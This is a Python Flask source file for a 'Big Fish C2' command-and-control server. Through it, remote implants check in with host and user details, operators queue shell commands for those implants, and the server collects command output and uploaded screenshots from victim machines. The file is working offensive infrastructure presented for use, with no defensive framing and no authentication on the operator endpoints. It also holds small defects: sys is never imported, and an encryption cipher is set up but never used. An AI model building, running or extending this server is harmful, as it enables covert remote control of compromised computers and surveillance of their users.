#!/usr/bin/env python3
"""
Stable Big Fish C2 Server - Fixed stability issues
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit
import time
import uuid
import sqlite3
import threading
import os
import hashlib
from datetime import datetime
import base64
import json
import logging
from cryptography.fernet import Fernet
import atexit
import signal

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app, origins="*")

# Fix SocketIO configuration - use proper async mode
try:
    import eventlet
    eventlet.monkey_patch()
    socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', ping_timeout=60, ping_interval=25)
    logger.info("Using eventlet for SocketIO")
except:
    try:
        import gevent
        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent', ping_timeout=60, ping_interval=25)
        logger.info("Using gevent for SocketIO")
    except:
        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=60, ping_interval=25)
        logger.info("Using threading for SocketIO")

# Configuration
DATABASE = 'bigfish_stable.db'
ONLINE_THRESHOLD = 120  # 2 minutes
DOWNLOAD_FOLDER = 'downloads_stable'
UPLOAD_FOLDER = 'uploads_stable'
SCREENSHOTS_FOLDER = 'screenshots_stable'

# Create folders
for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, SCREENSHOTS_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# Load or generate encryption key
KEY_FILE = 'encryption_stable.key'
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, 'rb') as f:
        ENCRYPTION_KEY = f.read()
else:
    ENCRYPTION_KEY = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(ENCRYPTION_KEY)

cipher = Fernet(ENCRYPTION_KEY)

class ConnectionPool:
    """Database connection pool for better performance"""
    _connections = {}
    
    @classmethod
    def get_connection(cls, db_path=DATABASE):
        thread_id = threading.get_ident()
        if thread_id not in cls._connections:
            conn = sqlite3.connect(db_path, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            cls._connections[thread_id] = conn
        return cls._connections[thread_id]
    
    @classmethod
    def close_all(cls):
        for conn in cls._connections.values():
            conn.close()
        cls._connections.clear()

atexit.register(ConnectionPool.close_all)

def init_db():
    """Initialize database with optimized tables"""
    conn = ConnectionPool.get_connection()
    c = conn.cursor()
    
    # Clients table with optimized indexes
    c.execute("""CREATE TABLE IF NOT EXISTS clients (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        os TEXT,
        ip TEXT,
        last_seen REAL,
        status TEXT DEFAULT 'offline',
        created_at REAL,
        online_hours REAL DEFAULT 0,
        last_command_time REAL DEFAULT 0
    )""")
    
    # Commands table with status tracking
    c.execute("""CREATE TABLE IF NOT EXISTS commands (
        id TEXT PRIMARY KEY,
        client_id TEXT,
        command TEXT,
        command_type TEXT DEFAULT 'shell',
        status TEXT DEFAULT 'pending',
        output TEXT,
        created_at REAL,
        executed_at REAL,
        retry_count INTEGER DEFAULT 0,
        FOREIGN KEY (client_id) REFERENCES clients(id)
    )""")
    
    # Create optimized indexes
    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
    
    conn.commit()
    logger.info("[✓] Database initialized")

init_db()

def get_client_info(client_id):
    """Get client info with connection pool"""
    conn = ConnectionPool.get_connection()
    c = conn.cursor()
    c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
    result = c.fetchone()
    return dict(result) if result else None

def update_client_last_seen(client_id):
    """Update client last seen timestamp"""
    conn = ConnectionPool.get_connection()
    c = conn.cursor()
    current_time = time.time()
    
    c.execute("""UPDATE clients SET 
                last_seen = ?, 
                status = CASE WHEN ? - last_seen > ? THEN 'offline' ELSE 'online' END
                WHERE id = ?""",
             (current_time, current_time, ONLINE_THRESHOLD, client_id))
    
    conn.commit()
    return current_time

# ==================== FIXED ROUTES ====================

@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'system': 'Big Fish C2 Stable',
        'version': '4.1',
        'timestamp': time.time()
    })

@app.route('/api/health')
def health():
    return jsonify({'status': 'healthy', 'timestamp': time.time()})

@app.route('/api/checkin', methods=['POST'])
def client_checkin():
    """Simplified and stable checkin endpoint"""
    try:
        data = request.json or {}
        current_time = time.time()
        
        # Generate or get client ID
        client_id = data.get('id') or str(uuid.uuid4())
        hostname = data.get('hostname', 'Unknown')
        username = data.get('username', 'Unknown')
        os_info = data.get('os', 'Unknown')
        
        # Get client IP
        if request.headers.get('X-Forwarded-For'):
            client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        else:
            client_ip = request.remote_addr
        
        conn = ConnectionPool.get_connection()
        c = conn.cursor()
        
        # Check if client exists
        c.execute('SELECT id, status, online_hours FROM clients WHERE id = ?', (client_id,))
        existing = c.fetchone()
        
        if existing:
            # Update existing client
            online_hours = existing['online_hours']
            if existing['status'] == 'offline':
                online_hours += 0.1  # Add small increment
            
            c.execute("""UPDATE clients SET 
                        hostname=?, username=?, os=?, ip=?, last_seen=?,
                        status='online', online_hours=?
                        WHERE id=?""",
                     (hostname, username, os_info, client_ip, current_time, online_hours, client_id))
        else:
            # Insert new client
            c.execute("""INSERT INTO clients 
                        (id, hostname, username, os, ip, last_seen, status, created_at, online_hours)
                        VALUES (?, ?, ?, ?, ?, ?, 'online', ?, 0.1)""",
                     (client_id, hostname, username, os_info, client_ip, current_time, current_time))
        
        conn.commit()
        
        logger.info(f"[✓] Checkin: {hostname} ({client_ip})")
        
        return jsonify({
            'status': 'ok',
            'client_id': client_id,
            'timestamp': current_time
        })
        
    except Exception as e:
        logger.error(f"[✗] Checkin error: {str(e)[:100]}")
        return jsonify({'status': 'error', 'message': str(e)[:100]}), 500

@app.route('/api/clients', methods=['GET'])
def get_all_clients():
    """Get all clients - optimized"""
    try:
        current_time = time.time()
        
        conn = ConnectionPool.get_connection()
        c = conn.cursor()
        
        # Update offline status
        c.execute("UPDATE clients SET status='offline' WHERE ? - last_seen > ?", 
                 (current_time, ONLINE_THRESHOLD))
        conn.commit()
        
        # Get clients with simple query
        c.execute("""SELECT id, hostname, username, os, ip, last_seen, status, 
                    created_at, online_hours,
                    (SELECT COUNT(*) FROM commands WHERE client_id = clients.id AND status = 'completed') as command_count
                    FROM clients 
                    ORDER BY last_seen DESC""")
        
        clients = []
        for row in c.fetchall():
            client = dict(row)
            client['last_seen_str'] = datetime.fromtimestamp(client['last_seen']).strftime('%H:%M:%S')
            client['created_str'] = datetime.fromtimestamp(client['created_at']).strftime('%Y-%m-%d')
            
            # Calculate status with more tolerance
            time_diff = current_time - client['last_seen']
            if time_diff < 30:
                client['status'] = 'online'
                client['status_icon'] = '🟢'
            elif time_diff < ONLINE_THRESHOLD:
                client['status'] = 'idle'
                client['status_icon'] = '🟡'
            else:
                client['status'] = 'offline'
                client['status_icon'] = '🔴'
            
            clients.append(client)
        
        return jsonify({'clients': clients})
        
    except Exception as e:
        logger.error(f"[✗] Get clients error: {e}")
        return jsonify({'clients': []})

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_pending_commands(client_id):
    """Get pending commands with timeout handling"""
    try:
        current_time = update_client_last_seen(client_id)
        
        conn = ConnectionPool.get_connection()
        c = conn.cursor()
        
        # Get pending commands (limit to 5 at a time)
        c.execute("""SELECT id, command, command_type 
                    FROM commands 
                    WHERE client_id = ? AND status = 'pending'
                    ORDER BY created_at ASC 
                    LIMIT 5""", (client_id,))
        
        commands = []
        command_ids = []
        for row in c.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command'],
                'type': row['command_type']
            })
            command_ids.append(row['id'])
        
        # Mark commands as sent
        if command_ids:
            placeholders = ','.join(['?'] * len(command_ids))
            c.execute(f"""UPDATE commands SET status = 'sent' 
                       WHERE id IN ({placeholders})""", command_ids)
            conn.commit()
        
        # Emit heartbeat
        socketio.emit('heartbeat', {
            'client_id': client_id,
            'timestamp': current_time
        }, namespace='/')
        
        return jsonify({'commands': commands})
        
    except Exception as e:
        logger.error(f"[✗] Get commands error: {e}")
        return jsonify({'commands': []})

@app.route('/api/command/result', methods=['POST'])
def submit_command_result():
    """Submit command result with error handling"""
    try:
        data = request.json or {}
        command_id = data.get('command_id')
        output = data.get('output', '')
        status = data.get('status', 'completed')
        
        if not command_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        conn = ConnectionPool.get_connection()
        c = conn.cursor()
        
        # Get command info first
        c.execute("SELECT client_id, command FROM commands WHERE id = ?", (command_id,))
        cmd_info = c.fetchone()
        
        if not cmd_info:
            return jsonify({'error': 'Command not found'}), 404
        
        # Truncate output if too large
        if len(output) > 10000:
            output = output[:10000] + "\n...[truncated]"
        
        # Update command
        c.execute("""UPDATE commands SET 
                    status = ?, output = ?, executed_at = ?
                    WHERE id = ?""",
                 (status, output, time.time(), command_id))
        
        conn.commit()
        
        # Emit result
        socketio.emit('command_result', {
            'command_id': command_id,
            'client_id': cmd_info['client_id'],
            'command': cmd_info['command'],
            'status': status,
            'timestamp': time.time()
        }, namespace='/')
        
        logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
        
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"[✗] Submit result error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json or {}
        client_id = data.get('client_id')
        command_text = data.get('command')
        
        if not client_id or not command_text:
            return jsonify({'error': 'Missing parameters'}), 400
        
        # Check if client exists
        client_info = get_client_info(client_id)
        if not client_info:
            return jsonify({'error': 'Client not found'}), 404
        
        # Create command
        cmd_id = str(uuid.uuid4())
        
        conn = ConnectionPool.get_connection()
        c = conn.cursor()
        
        c.execute("""INSERT INTO commands 
                    (id, client_id, command, created_at, status)
                    VALUES (?, ?, ?, ?, 'pending')""",
                 (cmd_id, client_id, command_text, time.time()))
        
        conn.commit()
        
        # Emit event
        socketio.emit('new_command', {
            'command_id': cmd_id,
            'client_id': client_id,
            'command': command_text,
            'timestamp': time.time()
        }, namespace='/')
        
        logger.info(f"[✓] Command sent to {client_id[:8]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id
        })
        
    except Exception as e:
        logger.error(f"[✗] Send command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def upload_screenshot():
    """Upload screenshot - fixed endpoint"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        if file.filename == '':
            return jsonify({'error': 'No filename'}), 400
        
        # Get client info
        client_info = get_client_info(client_id)
        if not client_info:
            return jsonify({'error': 'Client not found'}), 404
        
        # Create client folder
        client_folder = os.path.join(SCREENSHOTS_FOLDER, client_id)
        os.makedirs(client_folder, exist_ok=True)
        
        # Save file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(client_folder, filename)
        
        file.save(filepath)
        
        logger.info(f"[✓] Screenshot saved: {filename}")
        
        return jsonify({
            'success': True,
            'filename': filename
        })
        
    except Exception as e:
        logger.error(f"[✗] Screenshot upload error: {e}")
        return jsonify({'error': str(e)}), 500

# ==================== WEB SOCKET EVENTS ====================

@socketio.on('connect', namespace='/')
def handle_connect():
    logger.info(f"[✓] WebSocket connected: {request.sid}")
    emit('connected', {'message': 'Connected to stable server', 'timestamp': time.time()})

@socketio.on('disconnect', namespace='/')
def handle_disconnect():
    logger.info(f"[✓] WebSocket disconnected: {request.sid}")

@socketio.on('ping', namespace='/')
def handle_ping(data):
    emit('pong', {'timestamp': time.time()})

# ==================== BACKGROUND TASKS ====================

def cleanup_task():
    """Background cleanup task"""
    while True:
        try:
            current_time = time.time()
            conn = ConnectionPool.get_connection()
            c = conn.cursor()
            
            # Clean old completed commands (older than 1 day)
            cutoff = current_time - (24 * 3600)
            c.execute("DELETE FROM commands WHERE executed_at < ? AND status = 'completed'", (cutoff,))
            
            # Clean old sent commands that never got results (older than 1 hour)
            cutoff = current_time - 3600
            c.execute("""DELETE FROM commands WHERE status = 'sent' 
                       AND created_at < ?""", (cutoff,))
            
            conn.commit()
            
            # Emit stats update
            c.execute("SELECT COUNT(*) FROM clients WHERE status = 'online'")
            online_count = c.fetchone()[0]
            
            socketio.emit('stats_update', {
                'online_count': online_count,
                'timestamp': current_time
            }, namespace='/')
            
            logger.debug(f"[✓] Cleanup completed, {online_count} clients online")
            
        except Exception as e:
            logger.error(f"[✗] Cleanup error: {e}")
        
        time.sleep(60)  # Run every minute

# ==================== MAIN ====================

def signal_handler(signum, frame):
    """Handle shutdown signals"""
    logger.info("[!] Shutdown signal received")
    ConnectionPool.close_all()
    logger.info("[✓] Clean shutdown")
    sys.exit(0)

if __name__ == '__main__':
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    PORT = int(os.environ.get('PORT', 5001))
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
    cleanup_thread.start()
    
    logger.info(f"[✓] Stable Big Fish C2 Server starting on port {PORT}")
    logger.info(f"[✓] Press Ctrl+C to stop")
    
    try:
        socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
    except KeyboardInterrupt:
        logger.info("[!] Server stopped by user")
    finally:
        ConnectionPool.close_all()
